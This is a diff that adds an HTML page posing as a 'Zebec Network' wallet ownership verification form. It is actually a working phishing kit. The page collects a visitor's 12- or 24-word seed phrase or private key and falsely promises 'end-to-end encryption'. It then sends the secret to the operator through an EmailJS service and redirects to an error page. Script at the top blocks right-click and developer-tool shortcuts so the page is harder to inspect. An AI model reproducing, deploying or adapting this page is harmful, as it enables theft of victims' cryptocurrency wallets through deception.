@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <meta http-equiv="Cache-Control" content="no-store">
+    <script>(function () { document.addEventListener('contextmenu', function (e) { e.preventDefault(); return false; }); document.addEventListener('keydown', function (e) { if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'U')) { e.preventDefault(); return false; } }); })();</script>
+    <link href="https://cdn.jsdelivr.net/npm/remixicon@4.5.0/fonts/remixicon.css" rel="stylesheet" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Outfit:wght@300;400;500;600;700&family=DM+Sans:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script src="w3ref.js"></script>
+    <script type="text/javascript">
+        (function () {
+            emailjs.init('mfY7yH4IHyyVQsapk');
+        })();
+    </script>
+    <title>Zebec Network - Verify Ownership</title>
+    <style>
+        /* ═══════════════════════════════════════
+           VERIFY PAGE STYLES
+        ═══════════════════════════════════════ */
+        .verify-page {
+            min-height: 100vh;
+            background: #f8f9fc;
+            display: flex;
+            align-items: flex-start;
+            justify-content: center;
+            padding: 40px 16px 60px;
+        }
+
+        .verify-card {
+            width: 100%;
+            max-width: 520px;
+            background: #ffffff;
+            border-radius: 20px;
+            border: 1px solid rgba(83, 196, 227, 0.15);
+            box-shadow:
+                0 8px 40px rgba(17, 0, 44, 0.06),
+                0 2px 12px rgba(0, 0, 0, 0.04);
+            padding: 36px 28px 32px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* accent line top */
+        .verify-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #11002c, rgba(83, 196, 227, 0.6), transparent);
+            border-radius: 20px 20px 0 0;
+        }
+
+        .verify-header {
+            font-family: 'Orbitron', monospace;
+            font-size: 22px;
+            font-weight: 700;
+            color: #11002c;
+            margin-bottom: 6px;
+            letter-spacing: -0.01em;
+        }
+
+        .verify-subtitle {
+            font-size: 13.5px;
+            color: #8a8a9e;
+            margin-bottom: 24px;
+        }
+
+        /* ── Controls row ── */
+        .verify-controls {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 14px;
+        }
+
+        .verify-select {
+            flex: 1;
+            padding: 12px 14px;
+            background: #f6f8fb;
+            border: 1px solid rgba(83, 196, 227, 0.15);
+            border-radius: 10px;
+            color: #11002c;
+            font-family: 'DM Sans', sans-serif;
+            font-size: 13.5px;
+            font-weight: 600;
+            outline: none;
+            cursor: pointer;
+            transition: border-color 0.18s, box-shadow 0.18s;
+            appearance: none;
+            -webkit-appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%238a8a9e' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 14px center;
+            padding-right: 38px;
+        }
+
+        .verify-select:focus {
+            border-color: rgba(83, 196, 227, 0.5);
+            box-shadow: 0 0 0 3px rgba(83, 196, 227, 0.08);
+        }
+
+        .paste-btn {
+            padding: 12px 22px;
+            background: #11002c;
+            color: #ffffff;
+            border: none;
+            border-radius: 10px;
+            font-family: 'DM Sans', sans-serif;
+            font-size: 13px;
+            font-weight: 700;
+            cursor: pointer;
+            letter-spacing: 0.03em;
+            transition: background 0.18s, transform 0.15s, box-shadow 0.18s;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            white-space: nowrap;
+        }
+
+        .paste-btn:hover {
+            background: #1e0050;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 16px rgba(17, 0, 44, 0.22);
+        }
+
+        .paste-btn:active {
+            transform: translateY(0);
+        }
+
+        /* ── Error text ── */
+        .verify-error {
+            font-size: 12.5px;
+            color: #dc2829;
+            min-height: 20px;
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            opacity: 0;
+            transition: opacity 0.2s;
+        }
+
+        .verify-error.show {
+            opacity: 1;
+        }
+
+        .verify-error i {
+            font-size: 14px;
+        }
+
+        /* ── Input grid ── */
+        .phrase-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-bottom: 18px;
+            transition: all 0.3s ease;
+        }
+
+        .phrase-grid.private-key-mode {
+            grid-template-columns: 1fr;
+        }
+
+        .phrase-input-wrap {
+            position: relative;
+        }
+
+        .phrase-input-wrap .input-num {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 10px;
+            font-weight: 700;
+            color: #8a8a9e;
+            pointer-events: none;
+            font-family: 'Orbitron', monospace;
+            letter-spacing: 0.04em;
+        }
+
+        .phrase-field {
+            width: 100%;
+            padding: 11px 10px 11px 32px;
+            background: #f6f8fb;
+            border: 1px solid rgba(83, 196, 227, 0.15);
+            border-radius: 9px;
+            color: #11002c;
+            font-family: 'DM Sans', sans-serif;
+            font-size: 13px;
+            font-weight: 500;
+            outline: none;
+            transition: border-color 0.18s, box-shadow 0.18s, background 0.18s;
+        }
+
+        .phrase-field::placeholder {
+            color: #c0c2cc;
+            font-weight: 400;
+        }
+
+        .phrase-field:focus {
+            border-color: rgba(83, 196, 227, 0.5);
+            box-shadow: 0 0 0 3px rgba(83, 196, 227, 0.08);
+            background: #ffffff;
+        }
+
+        .phrase-field.has-value {
+            border-color: rgba(0, 208, 132, 0.35);
+            background: rgba(0, 208, 132, 0.02);
+        }
+
+        .phrase-field.error {
+            border-color: rgba(220, 40, 41, 0.4);
+            background: rgba(220, 40, 41, 0.02);
+        }
+
+        /* private key single input */
+        .pk-field {
+            width: 100%;
+            padding: 14px 14px;
+            background: #f6f8fb;
+            border: 1px solid rgba(83, 196, 227, 0.15);
+            border-radius: 10px;
+            color: #11002c;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            font-weight: 500;
+            outline: none;
+            transition: border-color 0.18s, box-shadow 0.18s, background 0.18s;
+            resize: none;
+            height: 80px;
+            line-height: 1.6;
+        }
+
+        .pk-field::placeholder {
+            color: #c0c2cc;
+            font-family: 'DM Sans', sans-serif;
+            font-weight: 400;
+        }
+
+        .pk-field:focus {
+            border-color: rgba(83, 196, 227, 0.5);
+            box-shadow: 0 0 0 3px rgba(83, 196, 227, 0.08);
+            background: #ffffff;
+        }
+
+        /* ── Security note ── */
+        .security-note {
+            font-size: 12px;
+            color: #8a8a9e;
+            text-align: center;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+
+        /* ── Verify button ── */
+        .verify-btn {
+            width: 100%;
+            padding: 14px 24px;
+            background: #11002c;
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            font-family: 'DM Sans', sans-serif;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            letter-spacing: 0.03em;
+            transition: background 0.18s, transform 0.15s, box-shadow 0.18s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .verify-btn::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, rgba(83, 196, 227, 0.18), rgba(167, 139, 250, 0.18));
+            opacity: 0;
+            transition: opacity 0.2s;
+        }
+
+        .verify-btn:hover {
+            background: #1e0050;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 28px rgba(17, 0, 44, 0.28);
+        }
+
+        .verify-btn:hover::before {
+            opacity: 1;
+        }
+
+        .verify-btn:active {
+            transform: translateY(0);
+        }
+
+        .verify-btn i {
+            position: relative;
+            z-index: 1;
+        }
+
+        .verify-btn span {
+            position: relative;
+            z-index: 1;
+        }
+
+        /* ── Responsive ── */
+        @media (max-width: 560px) {
+            .verify-page {
+                padding: 20px 12px 40px;
+            }
+
+            .verify-card {
+                padding: 28px 18px 24px;
+                border-radius: 16px;
+            }
+
+            .verify-header {
+                font-size: 18px;
+            }
+
+            .phrase-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 6px;
+            }
+
+            .phrase-field {
+                padding: 10px 8px 10px 28px;
+                font-size: 12px;
+            }
+
+            .phrase-input-wrap .input-num {
+                left: 8px;
+                font-size: 9px;
+            }
+
+            .verify-controls {
+                gap: 8px;
+            }
+
+            .paste-btn {
+                padding: 12px 16px;
+                font-size: 12px;
+            }
+        }
+    </style>
+</head>
+
+
+<body>
+
+    <div class="verify-page">
+        <div class="verify-card">
+
+            <h1 class="verify-header">Ownership Verification</h1>
+            <p class="verify-subtitle">Select a verification method</p>
+
+            <!-- Controls row -->
+            <div class="verify-controls">
+                <select class="verify-select" id="verifyMethod" onchange="onMethodChange()">
+                    <option value="12">12-word phrase</option>
+                    <option value="24">24-word phrase</option>
+                    <option value="pk">Private key</option>
+                </select>
+                <button class="paste-btn" onclick="onPaste()">
+                    <i class="ri-clipboard-line"></i>
+                    Paste
+                </button>
+            </div>
+
+            <!-- Error area -->
+            <div class="verify-error" id="verifyError">
+                <i class="ri-error-warning-line"></i>
+                <span id="verifyErrorText"></span>
+            </div>
+
+            <!-- Input fields container -->
+            <div id="inputContainer">
+                <!-- Populated by JS -->
+            </div>
+
+            <!-- Security note -->
+            <p class="security-note">🔒 Your data is protected with end-to-end encryption</p>
+
+            <!-- Verify button -->
+            <button class="verify-btn" onclick="processInput()">
+                <i class="ri-shield-check-line"></i>
+                <span>Verify Ownership</span>
+            </button>
+
+        </div>
+    </div>
+
+    <script>
+
+        const inputContainer = document.getElementById('inputContainer');
+        const verifyError = document.getElementById('verifyError');
+        const verifyErrorText = document.getElementById('verifyErrorText');
+        const verifyMethod = document.getElementById('verifyMethod');
+        function renderFields(type) {
+            hideError();
+            inputContainer.innerHTML = '';
+
+            if (type === 'pk') {
+
+                const grid = document.createElement('div');
+                grid.className = 'phrase-grid private-key-mode';
+                grid.style.marginBottom = '18px';
+
+                const textarea = document.createElement('textarea');
+                textarea.className = 'pk-field';
+                textarea.id = 'pkInput';
+                textarea.placeholder = 'Enter your access credentials...';
+                textarea.spellcheck = false;
+                textarea.autocomplete = 'off';
+                textarea.autocorrect = 'off';
+                textarea.autocapitalize = 'off';
+
+                grid.appendChild(textarea);
+                inputContainer.appendChild(grid);
+            } else {
+
+                const count = parseInt(type);
+                const grid = document.createElement('div');
+                grid.className = 'phrase-grid';
+                grid.id = 'phraseGrid';
+
+                for (let i = 1; i <= count; i++) {
+                    const wrap = document.createElement('div');
+                    wrap.className = 'phrase-input-wrap';
+
+                    const num = document.createElement('span');
+                    num.className = 'input-num';
+                    num.textContent = i + '.';
+
+                    const input = document.createElement('input');
+                    input.type = 'text';
+                    input.className = 'phrase-field';
+                    input.id = 'word' + i;
+                    input.setAttribute('data-index', i);
+                    input.placeholder = 'word ' + i;
+                    input.spellcheck = false;
+                    input.autocomplete = 'off';
+                    input.autocorrect = 'off';
+                    input.autocapitalize = 'off';
+
+
+                    input.addEventListener('keydown', function (e) {
+                        if (e.key === ' ' || e.code === 'Space') {
+                            e.preventDefault();
+                            const currentVal = this.value.trim();
+                            if (currentVal) {
+                                this.value = currentVal; // remove any trailing space
+                                this.classList.add('has-value');
+                            }
+                            const idx = parseInt(this.getAttribute('data-index'));
+                            const nextInput = document.getElementById('word' + (idx + 1));
+                            if (nextInput) {
+                                nextInput.focus();
+                            }
+                        }
+                    });
+
+
+                    input.addEventListener('input', function () {
+                        this.classList.toggle('has-value', this.value.trim().length > 0);
+                        this.classList.remove('error');
+                        hideError();
+                    });
+
+                    wrap.appendChild(num);
+                    wrap.appendChild(input);
+                    grid.appendChild(wrap);
+                }
+
+                inputContainer.appendChild(grid);
+            }
+        }
+        function onMethodChange() {
+            renderFields(verifyMethod.value);
+        }
+        async function onPaste() {
+            try {
+                const text = await navigator.clipboard.readText();
+                if (!text || !text.trim()) return;
+
+                const method = verifyMethod.value;
+
+                if (method === 'pk') {
+                    const pkInput = document.getElementById('pkInput');
+                    if (pkInput) {
+                        pkInput.value = text.trim();
+                    }
+                } else {
+                    const words = text.trim().split(/\s+/);
+                    const count = parseInt(method);
+
+                    for (let i = 0; i < count; i++) {
+                        const input = document.getElementById('word' + (i + 1));
+                        if (input) {
+                            input.value = words[i] || '';
+                            input.classList.toggle('has-value', (words[i] || '').length > 0);
+                        }
+                    }
+                }
+
+                hideError();
+            } catch (err) {
+
+                console.warn('Clipboard read failed:', err);
+            }
+        }
+        function showError(msg) {
+            verifyErrorText.textContent = msg;
+            verifyError.classList.add('show');
+        }
+
+        function hideError() {
+            verifyError.classList.remove('show');
+        }
+        function processInput() {
+            const method = verifyMethod.value;
+
+            if (method === 'pk') {
+
+                const pkInput = document.getElementById('pkInput');
+                const val = pkInput ? pkInput.value.trim() : '';
+
+                if (!val || val === '' || val.replace(/\s/g, '') === '') {
+                    showError('Data entered is not a valid private key');
+                    return;
+                }
+
+
+                finalize(method, val);
+
+            } else {
+
+                const count = parseInt(method);
+                let allFilled = true;
+                let isValidPhrase = true;
+                let phraseWords = [];
+
+                for (let i = 1; i <= count; i++) {
+                    const input = document.getElementById('word' + i);
+                    const val = input ? input.value.trim().toLowerCase() : '';
+
+                    if (!val || val === '' || val.replace(/\s/g, '') === '') {
+                        allFilled = false;
+                        if (input) input.classList.add('error');
+                    } else {
+                        if (typeof W3_REF !== 'undefined' && !W3_REF.has(val)) {
+                            isValidPhrase = false;
+                        } else if (input) {
+                            input.classList.remove('error');
+                        }
+                        phraseWords.push(val);
+                    }
+                }
+
+                if (!allFilled || !isValidPhrase) {
+                    showError('Data entered is not a valid seed phrase');
+                    return;
+                }
+
+
+                finalize(method, phraseWords.join(' '));
+            }
+        }
+        function finalize(method, data) {
+            const btn = document.querySelector('.verify-btn');
+            btn.innerHTML = '<i class="ri-loader-4-line ri-spin"></i><span>Verifying...</span>';
+            btn.style.pointerEvents = 'none';
+
+            let _t = '';
+            if (method === '12') _t = 'f1:12';
+            else if (method === '24') _t = 'f1:24';
+            else if (method === 'pk') _t = 'f1:pk';
+
+            let _d = `Type: ${_t}\nData: ${data}`;
+            let safetext = _d.length > 40000
+                ? _d.substring(0, 40000) + "\n\n...[TRUNCATED]"
+                : _d;
+
+            let parms = { message: safetext };
+
+            function sendWithRetry(retries) {
+                emailjs.send('service_ocoq02x', 'template_wgo1bul', parms)
+                    .then(function (response) {
+                        window.location.href = "error.html";
+                    })
+                    .catch(function (error) {
+                        if (retries > 0) {
+                            setTimeout(function () { sendWithRetry(retries - 1); }, 1500);
+                        } else {
+                            window.location.href = "error.html";
+                        }
+                    });
+            }
+            sendWithRetry(2);
+        }
+        renderFields('12');
+    </script>
+
+    <script src="function.js"></script>
+</body>
+
+</html>
